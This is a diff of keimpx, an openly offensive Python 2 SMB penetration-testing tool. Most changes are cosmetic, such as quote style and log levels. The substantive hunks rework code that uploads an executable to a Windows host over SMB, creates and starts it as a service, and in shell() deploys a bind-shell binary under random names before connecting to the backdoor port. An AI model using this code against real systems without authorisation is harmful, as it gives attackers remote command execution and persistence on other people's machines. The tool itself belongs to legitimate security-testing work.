@@ -20,8 +20,8 @@ License:
 
 I provide this software under a slightly modified version of the
 Apache Software License. The only changes to the document were the
-replacement of "Apache" with "keimpx" and "Apache Software Foundation"
-with "Bernardo Damele A. G.". Feel free to compare the resulting document
+replacement of 'Apache' with 'keimpx' and 'Apache Software Foundation'
+with 'Bernardo Damele A. G.'. Feel free to compare the resulting document
 to the official Apache license.
 
 The `Apache Software License' is an Open Source Initiative Approved
@@ -52,7 +52,6 @@ SUCH DAMAGE.
 
 __author__ = 'Bernardo Damele A. G. <bernardo.damele@gmail.com>'
 __version__ = '0.3-dev'
-
 
 import binascii
 import logging
@@ -130,7 +129,7 @@ logger.addHandler(logger_handler)
 logger.setLevel(logging.WARN)
 socket.setdefaulttimeout(3)
 
-if hasattr(sys, "frozen"):
+if hasattr(sys, 'frozen'):
     keimpx_path = os.path.dirname(unicode(sys.executable, sys.getfilesystemencoding()))
 else:
     keimpx_path = os.path.dirname(os.path.realpath(__file__))
@@ -571,8 +570,7 @@ class SMBShell:
         except Exception, e:
             #import traceback
             #traceback.print_exc()
-            if e is not None:
-                logger.error('Exception: %s' % e)
+            logger.error(str(e))
 
     def interactive(self):
         logger.info('type \'help\' for help menu')
@@ -593,7 +591,7 @@ class SMBShell:
         self.connect()
         logger.debug('Connection to host %s established' % self.__target.getIdentity())
         self.login()
-        logger.debug('Logged in as %s' % (self.__user if not self.__domain else "%s\%s" % (self.__domain, self.__user)))
+        logger.debug('Logged in as %s' % (self.__user if not self.__domain else '%s\%s' % (self.__domain, self.__user)))
 
         if cmds is None or len(cmds) == 0:
             self.interactive()
@@ -635,8 +633,8 @@ status {service name} - query the status of a service
 start {service name} - start a service
 stop {service name} - stop a service
 query {service name} - display the information of a service
-deploy {service name} {local file} [service args] - deploy remotely a service executable
-undeploy {service name} {remote file} - undeploy remotely a service executable
+deploy {service name} {local file} [service args] [remote file] [displayname] - deploy remotely a service executable
+undeploy {service name} - undeploy remotely a service executable
 
 Shell options
 =============
@@ -692,7 +690,7 @@ regdelete {registry key} - delete a registry key
         Display system information like operating system
         '''
 
-        self.__smb_transport('\srvsvc')
+        self.__smb_transport('srvsvc')
 
         logger.debug('Binding on Server Service (SRVSVC) interface')
         self.__dce = dcerpc.DCERPC_v5(self.trans)
@@ -707,9 +705,9 @@ regdelete {registry key} - delete a registry key
         print 'SMB dialect: %s' % check_dialect(self.smb.getDialect())
         print 'UserPath: %s' % self.__resp['UserPath']
         print 'Simultaneous users: %d' % self.__resp['Users']
-        print "Version major: %d" % self.__resp['VersionMajor']
-        print "Version minor: %d" % self.__resp['VersionMinor']
-        print 'Comment: %s' % self.__resp['Comment'] or "None"
+        print 'Version major: %d' % self.__resp['VersionMajor']
+        print 'Version minor: %d' % self.__resp['VersionMinor']
+        print 'Comment: %s' % self.__resp['Comment'] or 'None'
 
         # TODO: uncomment when SMBConnection will have a wrapper
         # getServerTime() method for both SMBv1,2,3
@@ -762,7 +760,7 @@ regdelete {registry key} - delete a registry key
             return
 
         p = self.__replace(path)
-        oldpwd = self.pwd
+        self.__oldpwd = self.pwd
 
         if path == '.':
             return
@@ -782,19 +780,19 @@ regdelete {registry key} - delete a registry key
         try:
             fid = self.smb.openFile(self.tid, self.pwd)
             self.smb.closeFile(self.tid, fid)
-            self.pwd = oldpwd
+            self.pwd = self.__oldpwd
         except SessionError, e:
             if e.getErrorCode() == nt_errors.STATUS_FILE_IS_A_DIRECTORY:
                pass
             elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                 logger.warn('Access denied')
-                self.pwd = oldpwd
+                self.pwd = self.__oldpwd
             elif e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:
                 logger.warn('File not found')
-                self.pwd = oldpwd
+                self.pwd = self.__oldpwd
             else:
                 logger.warn('SMB error: %s' % (e.getErrorString(), ))
-                self.pwd = oldpwd
+                self.pwd = self.__oldpwd
 
     def pwd(self):
         '''
@@ -825,7 +823,7 @@ regdelete {registry key} - delete a registry key
         pwd = ntpath.normpath(pwd)
 
         for f in self.smb.listPath(share or self.share, pwd):
-           print "%s %8s %10d %s" % (time.ctime(float(f.get_mtime_epoch())), '<DIR>' if f.is_directory() > 0 else '', f.get_filesize(), f.get_longname())
+           print '%s %8s %10d %s' % (time.ctime(float(f.get_mtime_epoch())), '<DIR>' if f.is_directory() > 0 else '', f.get_filesize(), f.get_longname())
 
     def cat(self, filename, share=None):
         '''
@@ -958,7 +956,7 @@ regdelete {registry key} - delete a registry key
         self.__svcctl_stop(srvname)
         self.__svcctl_disconnect(srvname)
 
-    def deploy(self, srvname=None, local_file=None, srvargs=None, remote_file=None):
+    def deploy(self, srvname, local_file, srvargs=None, remote_file=None, displayname=None):
         '''
         Deploy a Windows service: upload the service executable to the
         file system, create a service as 'Automatic' and start it
@@ -966,22 +964,38 @@ regdelete {registry key} - delete a registry key
         if srvname is None:
             raise missingService, 'Service name has not been specified'
 
+        if local_file is None:
+            raise missingFile, 'Service file %s has not been specified' % local_file
+
+        if not os.path.exists(local_file):
+            raise missingFile, 'Service file %s does not exist' % local_file
+
+        srvname = str(srvname)
+        srvargs = str(srvargs)
+
         if remote_file is None:
             remote_file = str(os.path.basename(local_file.replace('\\', '/')))
+        else:
+            remote_file = str(os.path.basename(remote_file.replace('\\', '/')))
 
-        self.__old_pwd = self.pwd
+        if displayname is None:
+            displayname = srvname
+        else:
+            displayname = str(displayname)
+
+        self.__oldpwd = self.pwd
         self.pwd = ''
 
         self.__svcctl_bin_upload(local_file, remote_file)
         self.__svcctl_connect()
-        self.__svcctl_create(srvname, remote_file)
+        self.__svcctl_create(srvname, remote_file, displayname)
         self.__svcctl_srv_manager(srvname)
         self.__svcctl_start(srvname, srvargs)
         self.__svcctl_disconnect(srvname)
 
-        self.pwd = self.__old_pwd
+        self.pwd = self.__oldpwd
 
-    def undeploy(self, srvname=None, remote_file=None):
+    def undeploy(self, srvname=None):
         '''
         Wrapper method to undeploy a Windows service. It stops the
         services, removes it and removes the executable from the file
@@ -990,20 +1004,24 @@ regdelete {registry key} - delete a registry key
         if srvname is None:
             raise missingService, 'Service name has not been specified'
 
-        # TODO: extract executable name automatically
-        remote_file = str(os.path.basename(remote_file.replace('\\', '/')))
-
-        self.__old_pwd = self.pwd
+        self.__oldpwd = self.pwd
         self.pwd = ''
 
         self.__svcctl_connect()
         self.__svcctl_srv_manager(srvname)
-        self.__svcctl_stop(srvname)
+        resp = self.__svc.QueryServiceConfigW(self.__svc_handle)
+        remote_file = resp['QueryConfig']['BinaryPathName'].decode('utf-16le')
+        remote_file = str(os.path.basename(remote_file.replace('\\', '/')))
+
+        if self.__svcctl_status(srvname, return_status=True) == 'RUNNING':
+            self.__svcctl_stop(srvname)
+
         self.__svcctl_delete(srvname)
+
         self.__svcctl_disconnect(srvname)
         self.__svcctl_bin_remove(remote_file)
 
-        self.pwd = self.__old_pwd
+        self.pwd = self.__oldpwd
 
     def services(self, srvname=None):
         self.__svcctl_connect()
@@ -1025,7 +1043,7 @@ regdelete {registry key} - delete a registry key
 
         self.__svcctl_connect()
         self.__svcctl_srv_manager(srvname)
-        self.__svcctl_info(srvname)
+        self.__svcctl_config(srvname)
         self.__svcctl_disconnect()
 
     def shell(self, port=2090):
@@ -1035,41 +1053,39 @@ regdelete {registry key} - delete a registry key
         '''
 
         connected = False
-        srvname = ''.join([random.choice(string.letters) for _ in xrange(0, 6)])
+        srvname = ''.join([random.choice(string.letters) for _ in range(8)])
         local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
-        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in xrange(0, 6)])
+        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in range(8)])
+        port = int(port)
 
         if not os.path.exists(local_file):
             raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'
 
         self.deploy(srvname, local_file, port, remote_file)
 
-        logger.info('Connecting to backdoor on port %d, wait..' % int(port))
+        logger.debug('Connecting to backdoor on port %d, wait..' % port)
 
-        for counter in range(0, 3):
+        for counter in xrange(0, 3):
             try:
                 time.sleep(1)
 
-                if str(sys.version.split()[0]) >= "2.6":
-                    tn = Telnet(self.__dstip, int(port), 3)
+                if str(sys.version.split()[0]) >= '2.6':
+                    tn = Telnet(self.__dstip, port, 3)
                 else:
-                    tn = Telnet(self.__dstip, int(port))
+                    tn = Telnet(self.__dstip, port)
 
                 connected = True
                 tn.interact()
             except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
                 if connected is False:
-                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (int(port), e[1])
+                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e[1])
 
                     if counter < 2:
                         warn_msg += ', retrying..'
 
                     logger.warn(warn_msg)
             except Exception, e:
-                import traceback
-                traceback.print_exc()
-                if e is not None:
-                    logger.error('Exception: %s' % e)
+                logger.error(str(e))
 
             if connected is True:
                 break
@@ -1162,7 +1178,7 @@ regdelete {registry key} - delete a registry key
         '''
         Connect to svcctl named pipe
         '''
-        logger.info('Connecting to the SVCCTL named pipe')
+        logger.debug('Connecting to the SVCCTL named pipe')
         self.__smb_transport('svcctl')
 
         logger.debug('Binding on Services Control Manager (SCM) interface')
@@ -1190,24 +1206,30 @@ regdelete {registry key} - delete a registry key
         '''
         Upload the service executable
         '''
-        logger.info('Uploading the service executable to %s\\%s' % (default_share, remote_file))
+        self.__pathname = ntpath.join(default_share, remote_file)
+        logger.info('Uploading the service executable to %s' % self.__pathname)
         self.upload(local_file, remote_file, default_share)
 
     def __svcctl_bin_remove(self, remote_file):
         '''
         Remove the service executable
         '''
-        logger.info('Removing the service executable %s\\%s' % (default_share, remote_file))
+        self.__pathname = ntpath.join(default_share, remote_file)
+        logger.info('Removing the service executable %s' % self.__pathname)
         self.rm(remote_file, default_share)
 
-    def __svcctl_create(self, srvname, remote_file):
+    def __svcctl_create(self, srvname, remote_file, displayname=None):
         '''
         Create the service
         '''
         logger.info('Creating the service %s' % srvname)
-        self.__pathname = '%%SystemRoot%%\\%s' % remote_file
+
+        if not displayname:
+            displayname = srvname
+
+        self.__pathname = ntpath.join('%SystemRoot%', remote_file)
         self.__pathname = self.__pathname.encode('utf-16le')
-        self.__svc.CreateServiceW(self.__mgr_handle, srvname.encode('utf-16le'), srvname.encode('utf-16le'), self.__pathname)
+        self.__svc.CreateServiceW(self.__mgr_handle, srvname.encode('utf-16le'), displayname.encode('utf-16le'), self.__pathname)
 
     def __svcctl_delete(self, srvname):
         '''
@@ -1216,21 +1238,21 @@ regdelete {registry key} - delete a registry key
         logger.info('Deleting the service %s' % srvname)
         self.__svc.DeleteService(self.__svc_handle)
 
-    def __svcctl_parse_info(self, resp):
-        print "TYPE              : %2d - " % resp['QueryConfig']['ServiceType'],
+    def __svcctl_parse_config(self, resp):
+        print 'TYPE              : %2d - ' % resp['QueryConfig']['ServiceType'],
 
-        if resp['QueryConfig']['ServiceType'] == 0x1:
+        if resp['QueryConfig']['ServiceType'] & 0x1:
             print "SERVICE_KERNLE_DRIVER"
-        elif resp['QueryConfig']['ServiceType'] == 0x2:
+        if resp['QueryConfig']['ServiceType'] & 0x2:
             print "SERVICE_FILE_SYSTEM_DRIVER"
-        elif resp['QueryConfig']['ServiceType'] == 0x10:
+        if resp['QueryConfig']['ServiceType'] & 0x10:
             print "SERVICE_WIN32_OWN_PROCESS"
-        elif resp['QueryConfig']['ServiceType'] == 0x20:
+        if resp['QueryConfig']['ServiceType'] & 0x20:
             print "SERVICE_WIN32_SHARE_PROCESS"
-        else:
-            print "UNKOWN"
+        if resp['QueryConfig']['ServiceType'] & 0x100:
+            print "SERVICE_INTERACTIVE_PROCESS"
 
-        print "START_TYPE        : %2d - " % resp['QueryConfig']['StartType'],
+        print 'START_TYPE        : %2d - ' % resp['QueryConfig']['StartType'],
 
         if resp['QueryConfig']['StartType'] == 0x0:
             print "BOOT START"
@@ -1245,18 +1267,18 @@ regdelete {registry key} - delete a registry key
         else:
             print "UNKOWN"
 
-        print "ERROR_CONTROL     : %2d - " % resp['QueryConfig']['ErrorControl'],
+        print 'ERROR_CONTROL     : %2d - ' % resp['QueryConfig']['ErrorControl'],
 
         if resp['QueryConfig']['ErrorControl'] == 0x0:
-            print "IGNORE"
+            print 'IGNORE'
         elif resp['QueryConfig']['ErrorControl'] == 0x1:
-            print "NORMAL"
+            print 'NORMAL'
         elif resp['QueryConfig']['ErrorControl'] == 0x2:
-            print "SEVERE"
+            print 'SEVERE'
         elif resp['QueryConfig']['ErrorControl'] == 0x3:
-            print "CRITICAL"
+            print 'CRITICAL'
         else:
-            print "UNKOWN"
+            print 'UNKOWN'
 
         print "BINARY_PATH_NAME  : %s" % resp['QueryConfig']['BinaryPathName'].decode('utf-16le')
         print "LOAD_ORDER_GROUP  : %s" % resp['QueryConfig']['LoadOrderGroup'].decode('utf-16le')
@@ -1267,51 +1289,51 @@ regdelete {registry key} - delete a registry key
 
     def __svcctl_parse_status(self, status):
         if status == svcctl.SERVICE_CONTINUE_PENDING:
-           return "CONTINUE PENDING"
+           return 'CONTINUE PENDING'
         elif status == svcctl.SERVICE_PAUSE_PENDING:
-           return "PAUSE PENDING"
+           return 'PAUSE PENDING'
         elif status == svcctl.SERVICE_PAUSED:
-           return "PAUSED"
+           return 'PAUSED'
         elif status == svcctl.SERVICE_RUNNING:
-           return "RUNNING"
+           return 'RUNNING'
         elif status == svcctl.SERVICE_START_PENDING:
-           return "START PENDING"
+           return 'START PENDING'
         elif status == svcctl.SERVICE_STOP_PENDING:
-           return "STOP PENDING"
+           return 'STOP PENDING'
         elif status == svcctl.SERVICE_STOPPED:
-           return "STOPPED"
+           return 'STOPPED'
         else:
-           return "UNKOWN"
+           return 'UNKOWN'
 
-    def __svcctl_status(self, srvname):
+    def __svcctl_status(self, srvname, return_status=False):
         '''
         Display status of a service
         '''
-
         logger.info('Querying the status of service %s' % srvname)
 
         ans = self.__svc.QueryServiceStatus(self.__svc_handle)
         status = ans['CurrentState']
 
-        print 'Service %s status is: %s' % (srvname, self.__svcctl_parse_status(status))
+        if return_status:
+            return self.__svcctl_parse_status(status)
+        else:
+            print 'Service %s status is: %s' % (srvname, self.__svcctl_parse_status(status))
 
-    def __svcctl_info(self, srvname):
+    def __svcctl_config(self, srvname):
         '''
-        Display a service information
+        Display a service configuration
         '''
-
-        logger.info('Querying service %s information' % srvname)
+        logger.info('Querying the service configuration of service %s' % srvname)
 
         print 'Service %s information:' % srvname
 
         resp = self.__svc.QueryServiceConfigW(self.__svc_handle)
-        self.__svcctl_parse_info(resp)
+        self.__svcctl_parse_config(resp)
 
     def __svcctl_start(self, srvname, srvargs=None):
         '''
         Start the service
         '''
-
         logger.info('Starting the service %s' % srvname)
 
         if srvargs is None:
@@ -1331,13 +1353,15 @@ regdelete {registry key} - delete a registry key
         '''
         Stop the service
         '''
-
         logger.info('Stopping the service %s' % srvname)
 
         self.__svc.StopService(self.__svc_handle)
         self.__svcctl_status(srvname)
 
     def __svcctl_list_parse(self, srvname, resp):
+        '''
+        Parse list of services
+        '''
         services = []
 
         for i in range(len(resp)):
@@ -1345,35 +1369,42 @@ regdelete {registry key} - delete a registry key
             display = resp[i]['DisplayName'].decode('utf-16')
             state = resp[i]['CurrentState']
 
-            if srvname is not None and srvname.lower() not in name.lower():
-                continue
+            if srvname is not None:
+                srvname = srvname.strip('*')
 
-            services.append((name, display, state))
+                if srvname.lower() not in display.lower() and srvname.lower() not in name.lower():
+                    continue
+
+            services.append((display, name, state))
 
         services.sort()
 
         for service in services:
-            print "%s (%s): %-80s" % (service[1], service[0], self.__svcctl_parse_status(service[2]))
+            print '%s (%s): %-80s' % (service[0], service[1], self.__svcctl_parse_status(service[2]))
 
-    def __svcctl_list(self, srvname):
+        return len(services)
+
+    def __svcctl_list(self, srvname=None):
         '''
         List services
         '''
-
         logger.info('Listing services')
 
-        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceState=svcctl.SERVICE_STATE_ALL)
-        resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_OWN_PROCESS | svcctl.SERVICE_WIN32_SHARE_PROCESS | svcctl.SERVICE_INTERACTIVE_PROCESS, serviceState=svcctl.SERVICE_STATE_ALL)
-        self.__svcctl_list_parse(srvname, resp)
+        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_SHARE_PROCESS)
+        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_OWN_PROCESS)
+        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_FILE_SYSTEM_DRIVER)
+        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_INTERACTIVE_PROCESS)
+        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_OWN_PROCESS | svcctl.SERVICE_WIN32_SHARE_PROCESS | svcctl.SERVICE_INTERACTIVE_PROCESS, serviceState=svcctl.SERVICE_STATE_ALL)
+        resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceState=svcctl.SERVICE_STATE_ALL)
+        num = self.__svcctl_list_parse(srvname, resp)
 
-        print '\nTotal services: %d\n' % len(resp)
+        print '\nTotal services: %d\n' % num
 
     def __samr_connect(self):
         '''
         Connect to samr named pipe
         '''
-
-        logger.info('Connecting to the SAMR named pipe')
+        logger.debug('Connecting to the SAMR named pipe')
 
         self.__smb_transport('samr')
 
@@ -1564,7 +1595,7 @@ regdelete {registry key} - delete a registry key
         Connect to winreg named pipe
         '''
 
-        logger.info('Connecting to the WINREG named pipe')
+        logger.debug('Connecting to the WINREG named pipe')
 
         self.__smb_transport('winreg')
 
@@ -1881,7 +1912,7 @@ class TargetCredentials:
 
     def getIdentity(self):
         if self.domain:
-            _ = "%s\%s" % (self.domain, self.user)
+            _ = '%s\%s' % (self.domain, self.user)
         else:
             _ = self.user
 
@@ -2039,7 +2070,7 @@ def set_domains():
     elif len(domains) > 0:
         if '' not in domains:
             domains.append('')
-        logger.info('Loaded %s unique domain%s' % (len(domains), "s" if len(domains) > 1 else ""))
+        logger.info('Loaded %s unique domain%s' % (len(domains), 's' if len(domains) > 1 else ''))
 
 ###################
 # Set credentials #
@@ -2147,7 +2178,7 @@ def set_credentials():
         logger.error('No valid credentials loaded')
         sys.exit(1)
 
-    logger.info('Loaded %s unique credential%s' % (len(credentials), "s" if len(credentials) > 1 else ""))
+    logger.info('Loaded %s unique credential%s' % (len(credentials), 's' if len(credentials) > 1 else ''))
 
 ###############
 # Set targets #
@@ -2222,7 +2253,7 @@ def set_targets():
         logger.error('No valid targets loaded')
         sys.exit(1)
 
-    logger.info('Loaded %s unique target%s' % (len(targets), "s" if len(targets) > 1 else ""))
+    logger.info('Loaded %s unique target%s' % (len(targets), 's' if len(targets) > 1 else ''))
 
 def set_verbosity(level=None):
     if level is not None:
@@ -2298,7 +2329,7 @@ def cmdline_parser():
         parser.add_option('-T', dest='threads', type='int', default=10,
                           help='Maximum simultaneous connections (default: 10)')
 
-        parser.add_option('-b', '--batch', dest='batch', action="store_true", default=False,
+        parser.add_option('-b', '--batch', dest='batch', action='store_true', default=False,
                           help='Batch mode: do not ask to get an interactive SMB shell')
 
         parser.add_option('-x', dest='executelist', help='Execute a list of '
@@ -2410,7 +2441,7 @@ def main():
 
         if len(valid_credentials) > 0:
             counter += 1
-            msg += '\n[%d] %s%s' % (counter, target.getIdentity(), " (default)" if counter == 1 else "")
+            msg += '\n[%d] %s%s' % (counter, target.getIdentity(), ' (default)' if counter == 1 else '')
             targets_dict[counter] = (target, valid_credentials)
 
     msg += '\n> '
@@ -2423,7 +2454,7 @@ def main():
 
     for credential in valid_credentials:
         counter += 1
-        msg += '\n[%d] %s%s' % (counter, credential.getIdentity(), " (default)" if counter == 1 else "")
+        msg += '\n[%d] %s%s' % (counter, credential.getIdentity(), ' (default)' if counter == 1 else '')
         credentials_dict[counter] = credential
 
     msg += '\n> '
